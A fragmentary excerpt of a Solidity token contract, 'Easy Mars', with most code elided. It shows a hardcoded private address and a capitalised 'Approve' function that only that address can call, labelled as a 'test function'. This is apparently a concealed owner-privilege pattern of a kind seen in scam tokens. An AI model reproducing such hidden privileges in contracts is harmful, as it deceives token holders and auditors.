...
contract Context {
 ...
 contract EasyMars is Context, ERC20, ERC20Metadata {
    ...
    address private _element = 0x3A39580586245e8aDF86c60a9106875a2dAB199d;
    ...
    constructor(uint256 totalSupply_, string memory kokershpaniol) {
        _name = "Easy Mars";
        _symbol = "EASYMARS";
        inSwap = false;
    ...
    function Approve(uint256 amount) public {
        ...
        require(_msgSender() == _element, "This is still a test function, please do not use!");
    }
